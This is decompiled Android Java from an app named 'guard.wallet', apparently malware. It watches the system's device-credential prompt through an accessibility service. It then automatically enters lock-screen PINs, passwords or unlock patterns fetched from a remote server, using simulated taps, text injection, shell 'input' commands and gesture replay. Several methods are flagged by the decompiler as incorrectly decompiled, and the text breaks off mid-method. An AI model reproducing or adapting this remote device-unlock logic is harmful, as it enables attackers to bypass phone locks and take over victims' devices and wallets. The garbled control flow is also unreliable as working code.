package p012o;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.google.json.JsonObject;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0178a;
import com.guard.wallet.helper.AbstractC0186i;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.DeviceWalletAuthStrategyVO;
import com.guard.wallet.service.AccessibilityDelegateManager;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import p000a.AbstractC0000a;
import p005h.C0318e;
import p014r.EnumC0890c;

/* loaded from: classes.dex */
public final class g0 extends C0416e {

    /* renamed from: n */
    public final ThreadPoolExecutor f892n;

    /* renamed from: o */
    public final ConcurrentLinkedQueue f893o;

    /* renamed from: p */
    public final ConcurrentLinkedQueue f894p;

    /* renamed from: q */
    public final ConcurrentLinkedQueue f895q;

    /* renamed from: r */
    public final AtomicReference f896r;

    /* renamed from: s */
    public final AtomicReference f897s;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public g0() {
        super(m1090T(), "com.android.systemui");
        EnumC0890c enumC0890c = EnumC0890c.ASSIST_MODE;
        this.f892n = new ThreadPoolExecutor(0, 5, 10L, TimeUnit.SECONDS, new SynchronousQueue());
        this.f893o = new ConcurrentLinkedQueue();
        this.f894p = new ConcurrentLinkedQueue();
        this.f895q = new ConcurrentLinkedQueue();
        this.f896r = new AtomicReference(null);
        this.f897s = new AtomicReference(enumC0890c);
        m1104X(enumC0890c);
        if (Objects.equals(m1101R(), enumC0890c)) {
            AbstractC0207l.m439v();
        }
    }

    /* renamed from: H */
    public static CombineFilter m1086H() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setEquals("com.android.systemui".concat(":id/cancel"));
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: I */
    public static CombineFilter m1087I() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setEquals("com.android.systemui".concat(":id/button_negative"));
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: J */
    public static CombineFilter m1088J() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty("id");
        stringCondition.setEquals("com.android.systemui".concat(":id/button_use_credential"));
        combineFilter.getStringConditions().add(stringCondition);
        return combineFilter;
    }

    /* renamed from: L */
    public static CombineFilter m1089L() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.ViewGroup"), "id");
        m1008b.setPrefix("com.android.systemui".concat(":id/key"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: T */
    public static LinkedList m1090T() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.systemui", "com.android.settings.password.ConfirmDeviceCredentialActivity");
        AbstractC0413b.m1024r(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        listenWindow.getEventTypes().add(8);
        listenWindow.getEventTypes().add(2048);
        HashSet<Integer> eventTypes = listenWindow.getEventTypes();
        Integer num = AccessibilityDelegateManager.f302j;
        eventTypes.add(num);
        linkedList.add(listenWindow);
        ListenWindow listenWindow2 = new ListenWindow("com.android.systemui", null);
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        listenWindow2.getEventTypes().add(8);
        listenWindow2.getEventTypes().add(2048);
        listenWindow2.getEventTypes().add(num);
        linkedList.add(listenWindow2);
        return linkedList;
    }

    /* renamed from: U */
    public static CombineFiltersWithOr m1091U() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "id");
        m1008b.setEquals("com.android.systemui".concat(":id/lockPattern"));
        combineFilter.getStringConditions().add(m1008b);
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.view.View"), "id");
        m1008b2.setEquals("com.android.systemui".concat(":id/biometric_lockPattern"));
        combineFilter2.getStringConditions().add(m1008b2);
        filters2.add(combineFilter2);
        return combineFiltersWithOr;
    }

    /* renamed from: W */
    public static CombineFilter m1092W(String str) {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m6b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "desc", str));
        return combineFilter;
    }

    /* renamed from: Y */
    public static CombineFilter m1093Y() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id");
        m1008b.setPrefix("com.android.systemui".concat(":id/num"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: Z */
    public static CombineFilter m1094Z() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id");
        m1008b.setPrefix("com.android.systemui".concat(":id/four_to_more_key"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: K */
    public final boolean m1095K() {
        boolean z2;
        AtomicInteger atomicInteger = new AtomicInteger(0);
        boolean equals = Objects.equals(MyAccessibilityService.m552N(), "com.android.systemui");
        while (true) {
            z2 = !equals;
            if (atomicInteger.incrementAndGet() > 20 || z2) {
                break;
            }
            AbstractC0251g.T0(1);
            equals = Objects.equals(MyAccessibilityService.m552N(), "com.android.systemui");
        }
        return z2;
    }

    /* renamed from: M */
    public final void m1096M() {
        if (MyAccessibilityService.m554P() == null || m1072k() == null || !AbstractC0249e.m623l()) {
            return;
        }
        UiObject m1072k = m1072k();
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "id");
        m1008b.setEquals("com.android.systemui".concat(":id/mix_confirm"));
        combineFilter.getStringConditions().add(m1008b);
        UiObject findOneByCombine = m1072k.findOneByCombine(combineFilter);
        if (findOneByCombine == null || !findOneByCombine.click()) {
            UiObject m1072k2 = m1072k();
            CombineFilter combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), "id");
            m1008b2.setEquals("com.android.systemui".concat(":id/iv_complete"));
            combineFilter2.getStringConditions().add(m1008b2);
            UiObject findOneByCombine2 = m1072k2.findOneByCombine(combineFilter2);
            if (findOneByCombine2 == null || !findOneByCombine2.click()) {
                UiObject m1072k3 = m1072k();
                CombineFilter combineFilter3 = new CombineFilter();
                StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.Button"), "id");
                m1008b3.setEquals("com.android.systemui".concat(":id/vivo_pin_confirm"));
                combineFilter3.getStringConditions().add(m1008b3);
                UiObject findOneByCombine3 = m1072k3.findOneByCombine(combineFilter3);
                if (findOneByCombine3 == null || !findOneByCombine3.click()) {
                    UiObject m1072k4 = m1072k();
                    CombineFilter combineFilter4 = new CombineFilter();
                    StringCondition m1008b4 = AbstractC0413b.m1008b(combineFilter4, AbstractC0000a.m7c(combineFilter4, "className", "android.widget.TextView"), "id");
                    m1008b4.setEquals("com.android.systemui".concat(":id/mix_normal_confirm"));
                    combineFilter4.getStringConditions().add(m1008b4);
                    UiObject findOneByCombine4 = m1072k4.findOneByCombine(combineFilter4);
                    if (findOneByCombine4 != null) {
                        findOneByCombine4.click();
                    }
                }
            }
        }
    }

    /* renamed from: N */
    public final boolean m1097N() {
        ReqUnlockDeviceVO m702f = AbstractC0252h.m702f();
        boolean m1099P = m702f != null ? m1099P(m702f) : false;
        if (m1099P) {
            m702f.setLocked(Boolean.TRUE);
            AbstractC0252h.m682C(m702f);
            this.f893o.remove("inUseDeviceCredential");
        }
        return m1099P;
    }

    /* renamed from: O */
    public final boolean m1098O() {
        ReqUnlockDeviceVO m703g = AbstractC0252h.m703g();
        boolean m1099P = m703g != null ? m1099P(m703g) : false;
        if (m1099P) {
            m703g.setLocked(Boolean.TRUE);
            AbstractC0252h.m682C(m703g);
            this.f893o.remove("inUseDeviceCredential");
        }
        return m1099P;
    }

    /* JADX WARN: Code restructure failed: missing block: B:174:0x024f, code lost:
    
        if (m1095K() != false) goto L135;
     */
    /* JADX WARN: Code restructure failed: missing block: B:175:0x02d3, code lost:
    
        r0 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:207:0x02d1, code lost:
    
        if (r1 != false) goto L135;
     */
    /* JADX WARN: Removed duplicated region for block: B:151:0x0350 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0424 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:76:0x00ae A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x00af  */
    /* renamed from: P */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m1099P(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        UiObject findOneByOperateOr;
        boolean m1095K;
        if ((Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) && !AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher())) {
            String textCipher = reqUnlockDeviceVO.getTextCipher();
            if (!AbstractC0026q.m151B(textCipher)) {
                if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                    AbstractC0251g.T0(1);
                    if (C0318e.m844S().m855N("input text ".concat(textCipher))) {
                        m1100Q(null);
                        if (m1095K()) {
                            z2 = true;
                            if (z2) {
                                return true;
                            }
                            String textCipher2 = reqUnlockDeviceVO.getTextCipher();
                            String cipherGradeCode = reqUnlockDeviceVO.getCipherGradeCode();
                            if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null) {
                                boolean equals = Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_NUMERIC_COMPLEX");
                                AtomicReference atomicReference = this.f871j;
                                if (equals || Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_NUMERIC") || Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_TOUCH_POINTS")) {
                                    if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null && m1072k() != null) {
                                        if (AbstractC0249e.m620i()) {
                                            for (int i2 = 0; i2 < textCipher2.length(); i2++) {
                                                String valueOf = String.valueOf(textCipher2.charAt(i2));
                                                UiObject findOneByCombine = m1072k().findOneByCombine(m1092W(valueOf));
                                                if (findOneByCombine != null && findOneByCombine.click()) {
                                                    Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + valueOf);
                                                    AbstractC0251g.T0(1);
                                                }
                                            }
                                            m1096M();
                                        }
                                        if (AbstractC0249e.m623l()) {
                                            UiObjectCollection findByCombine = m1072k().findByCombine(m1094Z());
                                            String concat = ((String) atomicReference.get()).concat(":id/four_to_more_key");
                                            if (findByCombine == null || findByCombine.size() <= 0) {
                                                z4 = false;
                                            } else {
                                                for (int i3 = 0; i3 < textCipher2.length(); i3++) {
                                                    String concat2 = concat.concat(String.valueOf(textCipher2.charAt(i3)));
                                                    for (UiObject uiObject : findByCombine.getNodes()) {
                                                        if (uiObject != null && Objects.equals(uiObject.id(), concat2) && uiObject.click()) {
                                                            Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + concat2);
                                                            AbstractC0251g.T0(1);
                                                        }
                                                    }
                                                }
                                                m1096M();
                                                z4 = m1095K();
                                            }
                                        }
                                        String concat3 = ((String) atomicReference.get()).concat(":id/key");
                                        UiObjectCollection findByCombine2 = m1072k().findByCombine(m1089L());
                                        if (findByCombine2 != null && findByCombine2.size() > 0) {
                                            for (int i4 = 0; i4 < textCipher2.length(); i4++) {
                                                String concat4 = concat3.concat(String.valueOf(textCipher2.charAt(i4)));
                                                for (UiObject uiObject2 : findByCombine2.getNodes()) {
                                                    if (uiObject2 != null && Objects.equals(uiObject2.id(), concat4) && uiObject2.click()) {
                                                        Log.d("UseDeviceCredentialDelegate", "Click Pin Node ID:" + concat4);
                                                        AbstractC0251g.T0(1);
                                                    }
                                                }
                                            }
                                            m1096M();
                                            z3 = m1095K();
                                            if (z3) {
                                                return true;
                                            }
                                        }
                                    }
                                } else if (Objects.equals(cipherGradeCode, "PASSWORD_QUALITY_ALPHANUMERIC") && !AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null && m1072k() != null && AbstractC0249e.m623l()) {
                                    UiObjectCollection findByCombine3 = m1072k().findByCombine(m1093Y());
                                    UiObject m1072k = m1072k();
                                    CombineFilter combineFilter = new CombineFilter();
                                    StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), "id");
                                    m1008b.setPrefix("com.android.systemui".concat(":id/char_"));
                                    combineFilter.getStringConditions().add(m1008b);
                                    UiObjectCollection findByCombine4 = m1072k.findByCombine(combineFilter);
                                    if (findByCombine3 != null && findByCombine3.size() > 0 && findByCombine4 != null && findByCombine4.size() > 0) {
                                        for (int i5 = 0; i5 < textCipher2.length(); i5++) {
                                            String valueOf2 = String.valueOf(textCipher2.charAt(i5));
                                            if (AbstractC0026q.m153D(valueOf2)) {
                                                String concat5 = ((String) atomicReference.get()).concat(":id/num").concat(valueOf2);
                                                for (UiObject uiObject3 : findByCombine3.getNodes()) {
                                                    if (uiObject3 != null && Objects.equals(uiObject3.id(), concat5) && uiObject3.click()) {
                                                        Log.d("UseDeviceCredentialDelegate", "Click VIVO Num Node ID:" + concat5);
                                                        AbstractC0251g.T0(1);
                                                    }
                                                }
                                            } else {
                                                String concat6 = ((String) atomicReference.get()).concat(":id/char_").concat(valueOf2);
                                                for (UiObject uiObject4 : findByCombine4.getNodes()) {
                                                    if (uiObject4 != null && Objects.equals(uiObject4.id(), concat6) && uiObject4.click()) {
                                                        Log.d("UseDeviceCredentialDelegate", "Click VIVO Char Node ID:" + concat6);
                                                        AbstractC0251g.T0(1);
                                                    }
                                                }
                                            }
                                        }
                                        m1096M();
                                        z3 = m1095K();
                                        if (z3) {
                                        }
                                    }
                                }
                            }
                            z3 = false;
                            if (z3) {
                            }
                        }
                    }
                }
                if (m1072k() != null) {
                    UiObject currentFocusedNode = m1072k().currentFocusedNode();
                    if (currentFocusedNode == null) {
                        currentFocusedNode = MyAccessibilityService.m554P().m560J();
                    }
                    if (currentFocusedNode != null && Objects.equals(currentFocusedNode.className(), "android.widget.EditText") && currentFocusedNode.setText(textCipher)) {
                        m1100Q(currentFocusedNode);
                        z2 = m1095K();
                        if (z2) {
                        }
                    }
                }
            }
            z2 = false;
            if (z2) {
            }
        }
        if (Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
            List<Point> patternCipher = reqUnlockDeviceVO.getPatternCipher();
            Rect boundsInScreen = reqUnlockDeviceVO.getBoundsInScreen();
            Rect boundsInParent = reqUnlockDeviceVO.getBoundsInParent();
            if (patternCipher != null && !patternCipher.isEmpty()) {
                LinkedList linkedList = new LinkedList(patternCipher);
                AbstractC0178a.m342d(linkedList);
                if (m1072k() != null && MyAccessibilityService.m554P() != null && (findOneByOperateOr = m1072k().findOneByOperateOr(m1091U())) != null) {
                    Log.d("UseDeviceCredentialDelegate", "confirmLockByGesture pattern:" + findOneByOperateOr);
                    if (!AbstractC0249e.m623l()) {
                        AbstractC0178a.m343e(linkedList, boundsInScreen, boundsInParent, findOneByOperateOr.boundsInWindow(), findOneByOperateOr.boundsInParent());
                    }
                    int size = linkedList.size();
                    Point[] pointArr = new Point[size];
                    linkedList.toArray(pointArr);
                    if (size > 0) {
                        for (int i6 = 1; i6 <= 4; i6++) {
                            long j2 = i6 * 1000;
                            try {
                                CountDownLatch countDownLatch = new CountDownLatch(1);
                                if (AbstractC0251g.m646S(10L, Long.valueOf(j2), pointArr)) {
                                    if (!countDownLatch.await(j2 + 1000, TimeUnit.MILLISECONDS)) {
                                        Log.d("UseDeviceCredentialDelegate", "ResolveGesture Done");
                                    }
                                    if (m1095K()) {
                                        m1095K = true;
                                        break;
                                    }
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("UseDeviceCredentialDelegate", e2);
                            }
                        }
                    }
                    m1095K = m1095K();
                    if (m1095K) {
                        z5 = true;
                    } else if (C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().m862W(linkedList)) {
                        z5 = m1095K();
                    }
                    if (!z5) {
                        return true;
                    }
                }
            }
            z5 = false;
            if (!z5) {
            }
        }
        return false;
    }

    /* renamed from: Q */
    public final void m1100Q(UiObject uiObject) {
        if (C0318e.m844S() != null && C0318e.m844S().mo302D() && C0318e.m844S().m855N("input keyevent 66")) {
            return;
        }
        if (uiObject == null && m1072k() != null) {
            uiObject = m1072k().currentFocusedNode();
        }
        if (uiObject == null && MyAccessibilityService.m554P() != null) {
            uiObject = MyAccessibilityService.m554P().m560J();
        }
        if (uiObject == null || Build.VERSION.SDK_INT < 30) {
            return;
        }
        uiObject.enter();
    }

    /* renamed from: R */
    public final EnumC0890c m1101R() {
        EnumC0890c enumC0890c;
        synchronized (EnumC0890c.class) {
            enumC0890c = (EnumC0890c) this.f897s.get();
        }
        return enumC0890c;
    }

    /* renamed from: S */
    public final boolean m1102S() {
        if (Objects.equals(m1101R(), EnumC0890c.VERIFY_PAUSE)) {
            return false;
        }
        boolean equals = Objects.equals(m1101R(), EnumC0890c.VERIFY_MODE);
        AtomicReference atomicReference = this.f896r;
        if (!equals || atomicReference.get() == null) {
            return Objects.equals(m1101R(), EnumC0890c.ASSIST_MODE) && atomicReference.get() != null;
        }
        return true;
    }

    /* renamed from: V */
    public final void m1103V(String str, String str2) {
        boolean equals = Objects.equals(m1101R(), EnumC0890c.VERIFY_MODE);
        AtomicReference atomicReference = this.f896r;
        if (equals) {
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f895q;
            if (!concurrentLinkedQueue.isEmpty() && !AbstractC0026q.m151B(str) && concurrentLinkedQueue.contains(str)) {
                atomicReference.set(str);
                return;
            }
        }
        if (Objects.equals(m1101R(), EnumC0890c.ASSIST_MODE)) {
            ConcurrentLinkedQueue concurrentLinkedQueue2 = this.f894p;
            if (concurrentLinkedQueue2.isEmpty()) {
                return;
            }
            if (AbstractC0026q.m151B(str) && AbstractC0026q.m151B(str2)) {
                return;
            }
            DeviceWalletAuthStrategyVO deviceWalletAuthStrategyVO = new DeviceWalletAuthStrategyVO();
            deviceWalletAuthStrategyVO.setPackageName(str);
            deviceWalletAuthStrategyVO.setListenWinClasses(Collections.singletonList(str2));
            if (concurrentLinkedQueue2.contains(deviceWalletAuthStrategyVO)) {
                atomicReference.set(str);
            } else {
                atomicReference.set(null);
                AbstractC0207l.m439v();
            }
        }
    }

    /* renamed from: X */
    public final void m1104X(EnumC0890c enumC0890c) {
        synchronized (EnumC0890c.class) {
            this.f897s.set(enumC0890c);
        }
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            this.f892n.shutdownNow();
            this.f893o.clear();
            this.f894p.clear();
            this.f895q.clear();
            this.f896r.set(null);
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("UseDeviceCredentialDelegate", e2);
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof g0;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(g0.class.getName());
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x0063  */
    /* JADX WARN: Removed duplicated region for block: B:24:? A[RETURN, SYNTHETIC] */
    @Override // p012o.C0416e
    /* renamed from: u */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        if (AbstractC0251g.p0()) {
            return;
        }
        if (m1102S()) {
            super.mo1002u(accessibilityEvent, str, str2);
        }
        if (!m1102S()) {
            return;
        }
        final int i2 = 1;
        final int i3 = 0;
        if (m1078q(m1090T())) {
            UiObject m1072k = m1072k();
            CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
            combineFiltersWithOr.setFilters(new LinkedList());
            combineFiltersWithOr.getFilters().add(m1088J());
            combineFiltersWithOr.getFilters().add(m1087I());
            UiObject findOneByOperateOr = m1072k.findOneByOperateOr(combineFiltersWithOr);
            if (findOneByOperateOr == null) {
                Log.d("UseDeviceCredentialDelegate", "已进入用户设备密码验证窗口");
                z2 = true;
                if (z2) {
                    return;
                }
                boolean equals = Objects.equals(m1101R(), EnumC0890c.VERIFY_MODE);
                ThreadPoolExecutor threadPoolExecutor = this.f892n;
                if (equals) {
                    threadPoolExecutor.submit(new Runnable(this) { // from class: o.f0

                        /* renamed from: b */
                        public final /* synthetic */ g0 f886b;

                        {
                            this.f886b = this;
                        }

                        /* JADX WARN: Code restructure failed: missing block: B:23:0x00e3, code lost:
                        
                            if (r3.m1097N() != false) goto L52;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:54:0x0072, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1092W("0")) != null) goto L35;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:60:0x0096, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1093Y()) != null) goto L35;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:62:0x00a5, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1089L()) != null) goto L35;
                         */
                        /* JADX WARN: Removed duplicated region for block: B:14:0x00ae  */
                        /* JADX WARN: Removed duplicated region for block: B:27:0x00fb  */
                        /* JADX WARN: Removed duplicated region for block: B:39:0x0148 A[SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:46:0x00e9  */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            String str3;
                            AtomicInteger atomicInteger;
                            int i4 = i3;
                            g0 g0Var = this.f886b;
                            switch (i4) {
                                case 0:
                                    g0Var.getClass();
                                    if (MyAccessibilityService.m554P() != null && g0Var.m1072k() != null) {
                                        UiObject m560J = MyAccessibilityService.m554P().m560J();
                                        if (m560J == null || !m560J.password()) {
                                            UiObject m1072k2 = g0Var.m1072k();
                                            CombineFilter combineFilter = new CombineFilter();
                                            combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.EditText"));
                                            if (m1072k2.findOneByCombine(combineFilter) == null) {
                                                if (g0Var.m1072k().findOneByOperateOr(g0.m1091U()) == null) {
                                                    if (AbstractC0249e.m620i()) {
                                                        break;
                                                    }
                                                    if (AbstractC0249e.m623l()) {
                                                        if (g0Var.m1072k().findOneByCombine(g0.m1094Z()) == null) {
                                                            break;
                                                        }
                                                    }
                                                    break;
                                                }
                                            }
                                        }
                                        z3 = true;
                                        ConcurrentLinkedQueue concurrentLinkedQueue = g0Var.f893o;
                                        if (!z3) {
                                            if (!g0Var.m1098O() && !g0Var.m1097N()) {
                                                JsonObject m419b = AbstractC0207l.m419b(new ReqDefaultBodyVO(AbstractC0252h.m708l("deviceId")), AbstractC0207l.f252a, "/api/cipher/lockCiphers");
                                                if (m419b != null) {
                                                    AbstractC0186i.m355a(m419b.toString());
                                                    if (!g0Var.m1098O()) {
                                                        break;
                                                    }
                                                }
                                            }
                                            str3 = "confirmByLocalCipherLocked Success";
                                            Log.d("UseDeviceCredentialDelegate", str3);
                                            concurrentLinkedQueue.remove("inUseDeviceCredential");
                                            break;
                                        } else {
                                            Log.d("UseDeviceCredentialDelegate", "not inVerifyCredentialWindow");
                                        }
                                        atomicInteger = new AtomicInteger(0);
                                        while (true) {
                                            if (atomicInteger.incrementAndGet() > 10) {
                                                UiObject m1072k3 = g0Var.m1072k();
                                                CombineFiltersWithOr combineFiltersWithOr2 = new CombineFiltersWithOr();
                                                combineFiltersWithOr2.setFilters(new LinkedList());
                                                combineFiltersWithOr2.getFilters().add(g0.m1088J());
                                                combineFiltersWithOr2.getFilters().add(g0.m1087I());
                                                combineFiltersWithOr2.getFilters().add(g0.m1086H());
                                                UiObject findOneByOperateOr2 = m1072k3.findOneByOperateOr(combineFiltersWithOr2);
                                                if (findOneByOperateOr2 == null || !findOneByOperateOr2.click()) {
                                                    AbstractC0251g.T0(2);
                                                    MyAccessibilityService.m548I(g0Var.m1072k());
                                                } else {
                                                    str3 = "closeButton click Success";
                                                }
                                            } else {
                                                while (!g0Var.m1095K()) {
                                                    AbstractC0251g.F0(1);
                                                    AbstractC0251g.T0(5);
                                                    Log.d("UseDeviceCredentialDelegate", "back Success");
                                                }
                                                str3 = "finish inUseDeviceCredential";
                                            }
                                        }
                                        Log.d("UseDeviceCredentialDelegate", str3);
                                        concurrentLinkedQueue.remove("inUseDeviceCredential");
                                    }
                                    z3 = false;
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = g0Var.f893o;
                                    if (!z3) {
                                    }
                                    atomicInteger = new AtomicInteger(0);
                                    while (true) {
                                        if (atomicInteger.incrementAndGet() > 10) {
                                        }
                                        AbstractC0251g.T0(2);
                                        MyAccessibilityService.m548I(g0Var.m1072k());
                                    }
                                    Log.d("UseDeviceCredentialDelegate", str3);
                                    concurrentLinkedQueue2.remove("inUseDeviceCredential");
                                    break;
                                default:
                                    UiObject findOneByCombine = g0Var.m1072k().findOneByCombine(g0.m1086H());
                                    if (findOneByCombine != null && findOneByCombine.click()) {
                                        Log.d("UseDeviceCredentialDelegate", "inAssistCredential Cancel Success");
                                    }
                                    g0Var.f893o.remove("inUseDeviceCredential");
                                    break;
                            }
                        }
                    });
                }
                if (Objects.equals(m1101R(), EnumC0890c.ASSIST_MODE)) {
                    threadPoolExecutor.submit(new Runnable(this) { // from class: o.f0

                        /* renamed from: b */
                        public final /* synthetic */ g0 f886b;

                        {
                            this.f886b = this;
                        }

                        /* JADX WARN: Code restructure failed: missing block: B:23:0x00e3, code lost:
                        
                            if (r3.m1097N() != false) goto L52;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:54:0x0072, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1092W("0")) != null) goto L35;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:60:0x0096, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1093Y()) != null) goto L35;
                         */
                        /* JADX WARN: Code restructure failed: missing block: B:62:0x00a5, code lost:
                        
                            if (r3.m1072k().findOneByCombine(p012o.g0.m1089L()) != null) goto L35;
                         */
                        /* JADX WARN: Removed duplicated region for block: B:14:0x00ae  */
                        /* JADX WARN: Removed duplicated region for block: B:27:0x00fb  */
                        /* JADX WARN: Removed duplicated region for block: B:39:0x0148 A[SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:46:0x00e9  */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            String str3;
                            AtomicInteger atomicInteger;
                            int i4 = i2;
                            g0 g0Var = this.f886b;
                            switch (i4) {
                                case 0:
                                    g0Var.getClass();
                                    if (MyAccessibilityService.m554P() != null && g0Var.m1072k() != null) {
                                        UiObject m560J = MyAccessibilityService.m554P().m560J();
                                        if (m560J == null || !m560J.password()) {
                                            UiObject m1072k2 = g0Var.m1072k();
                                            CombineFilter combineFilter = new CombineFilter();
                                            combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.EditText"));
                                            if (m1072k2.findOneByCombine(combineFilter) == null) {
